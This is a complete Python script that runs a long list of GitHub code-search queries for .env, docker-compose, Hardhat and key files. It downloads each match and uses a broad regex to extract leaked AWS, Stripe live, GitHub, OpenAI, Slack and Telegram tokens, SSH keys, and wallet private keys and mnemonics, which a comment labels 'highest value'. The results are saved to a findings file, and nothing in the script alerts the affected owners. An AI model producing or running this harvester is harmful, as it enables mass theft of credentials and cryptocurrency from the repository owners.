#!/usr/bin/env python3
import requests, json, time, re, os, sys
from datetime import datetime

TOKEN = os.environ.get('GH_TOKEN', '')
if not TOKEN:
    print('ERROR: GH_TOKEN not set', flush=True)
    sys.exit(1)
print('Token loaded.', flush=True)

HEADERS = {
    'Authorization': f'token {TOKEN}',
    'Accept': 'application/vnd.github.v3+json',
}

KEY_RE = re.compile(
    r'(AKIA[0-9A-Z]{16}'
    r'|sk_live_[a-zA-Z0-9]{24,}'
    r'|rk_live_[a-zA-Z0-9]{24,}'
    r'|ghp_[a-zA-Z0-9]{36}'
    r'|gho_[a-zA-Z0-9]{36}'
    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
    r'|AIza[0-9A-Za-z\-_]{35}'
    r'|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----'
    r'|(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:]\s*[A-Za-z0-9/+]{20,}'
    r'|(?:0x[0-9a-fA-F]{64})'
    r'|[0-9]{8,10}:[A-Za-z0-9_\-]{35}'
    r'|(?:MNEMONIC|mnemonic|seed_phrase|SEED_PHRASE)\s*[=:"\s]+([a-z ]{40,})'
    r'|(?:ETH_PRIVATE_KEY|WALLET_PRIVATE_KEY|WEB3_PRIVATE_KEY|DEPLOYER_PRIVATE_KEY)\s*[=:"\s]+(0x[0-9a-fA-F]{64}|[0-9a-fA-F]{64})'
    r'|(?:INFURA_PROJECT_SECRET|ALCHEMY_API_KEY|MORALIS_API_KEY)\s*[=:"\s]+([A-Za-z0-9_\-]{20,})'
    r'|(?:STRIPE_SECRET_KEY|STRIPE_LIVE_SECRET)\s*[=:"\s]+(sk_live_[A-Za-z0-9]{24,})'
    r'|(?:OPENAI_API_KEY)\s*[=:"\s]+(sk-[A-Za-z0-9]{32,})'
    r'|(?:TWILIO_AUTH_TOKEN)\s*[=:"\s]+([a-f0-9]{32})'
    r'|(?:TELEGRAM_BOT_TOKEN|BOT_TOKEN)\s*[=:"\s]+([0-9]{8,10}:[A-Za-z0-9_\-]{35})'
    r'|(?:privateKey|private_key)\s*[=:"\s]+(0x[0-9a-fA-F]{64}))',
    re.IGNORECASE
)

DORKS = [
    # crypto — highest value
    'filename:.env ETH_PRIVATE_KEY',
    'filename:.env WALLET_PRIVATE_KEY',
    'filename:.env DEPLOYER_PRIVATE_KEY',
    'filename:.env WEB3_PRIVATE_KEY',
    'filename:.env MNEMONIC',
    'filename:.env INFURA_PROJECT_SECRET',
    'filename:.env ALCHEMY_API_KEY',
    'filename:hardhat.config.js privateKey 0x',
    'filename:truffle-config.js privateKey',
    'filename:.env MORALIS_API_KEY',
    # stripe live
    'filename:.env STRIPE_SECRET_KEY sk_live',
    'filename:.env sk_live_',
    'sk_live_ filename:.env',
    # aws
    'filename:.env AWS_SECRET_ACCESS_KEY',
    'filename:.env AKIA',
    'AWS_SECRET_ACCESS_KEY filename:.env.local',
    # github PAT
    'filename:.env GITHUB_TOKEN ghp_',
    'filename:.env GH_TOKEN ghp_',
    # telegram bots
    'filename:.env TELEGRAM_BOT_TOKEN',
    'filename:.env BOT_TOKEN',
    'filename:config.py bot_token',
    # openai
    'filename:.env OPENAI_API_KEY',
    'filename:.env.local OPENAI_API_KEY',
    # docker exposed secrets
    'filename:docker-compose.yml POSTGRES_PASSWORD',
    'filename:docker-compose.yml MYSQL_ROOT_PASSWORD',
    'filename:docker-compose.yml SECRET_KEY',
    'filename:docker-compose.yml AWS_SECRET',
    'filename:docker-compose.yml STRIPE_SECRET',
    # firebase
    'filename:service-account.json private_key',
    'filename:firebase-adminsdk.json private_key',
    # twilio
    'filename:.env TWILIO_AUTH_TOKEN',
    # slack
    'filename:.env SLACK_BOT_TOKEN xoxb',
    'xoxb- filename:.env',
    # google api
    'filename:.env GOOGLE_API_KEY AIza',
    'AIzaSy filename:.env',
    # ssh keys in repos
    'filename:id_rsa BEGIN RSA PRIVATE KEY',
    'filename:id_ed25519 BEGIN OPENSSH PRIVATE KEY',
    # database urls with creds
    'filename:.env DATABASE_URL postgres://',
    'filename:.env DATABASE_URL mysql://',
    # general catch
    'filename:.env.production SECRET_KEY',
    'filename:.env.production API_KEY',
]

# load seen set
seen = set()
if os.path.exists('seen.txt'):
    for line in open('seen.txt'):
        seen.add(line.strip())
print(f'Seen: {len(seen)} already scanned', flush=True)

def search(query, page=1):
    url = 'https://api.github.com/search/code'
    params = {'q': query, 'per_page': 100, 'page': page}
    r = requests.get(url, headers=HEADERS, params=params, timeout=15)
    if r.status_code == 403:
        reset = int(r.headers.get('X-RateLimit-Reset', time.time() + 60))
        wait = max(reset - time.time(), 5)
        print(f'  rate limit — sleeping {wait:.0f}s', flush=True)
        time.sleep(wait)
        return None
    if r.status_code != 200:
        print(f'  error {r.status_code}: {r.text[:100]}', flush=True)
        return None
    return r.json()

def get_raw(url):
    raw = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    r = requests.get(raw, headers=HEADERS, timeout=10)
    return r.text[:8000] if r.status_code == 200 else ''

findings = []
new_seen = []

for dork in DORKS:
    print(f'\nDORK: {dork}', flush=True)
    for page in range(1, 3):  # 2 pages x 100 = 200 candidates per dork
        result = search(dork, page)
        if not result:
            break
        items = result.get('items', [])
        total = result.get('total_count', 0)
        if page == 1:
            print(f'  {total} total results', flush=True)
        if not items:
            break

        new_items = 0
        for item in items:
            html_url = item.get('html_url', '')
            repo = item.get('repository', {}).get('full_name', '')
            path = item.get('path', '')
            key = f'{repo}/{path}'

            if key in seen:
                continue

            new_items += 1
            seen.add(key)
            new_seen.append(key)

            try:
                content = get_raw(html_url)
                time.sleep(0.2)
            except:
                continue

            if not content:
                continue

            secrets = list(set(m.group(0)[:150] for m in KEY_RE.finditer(content)))
            if secrets:
                entry = {
                    'url': html_url,
                    'repo': repo,
                    'path': path,
                    'secrets': secrets[:10],
                    'found_at': datetime.utcnow().isoformat()
                }
                findings.append(entry)
                print(f'  HIT: {repo}/{path} — {len(secrets)} secrets', flush=True)

        print(f'  page {page}: {new_items} new candidates', flush=True)
        if len(items) < 100:
            break
        time.sleep(2)

    time.sleep(1)

print(f'\nTotal hits: {len(findings)}', flush=True)
print(f'New candidates scanned this run: {len(new_seen)}', flush=True)

with open('gh_findings.jsonl', 'w') as f:
    for r in findings:
        f.write(json.dumps(r) + '\n')

with open('seen.txt', 'a') as f:
    for key in new_seen:
        f.write(key + '\n')

print('Written to gh_findings.jsonl')
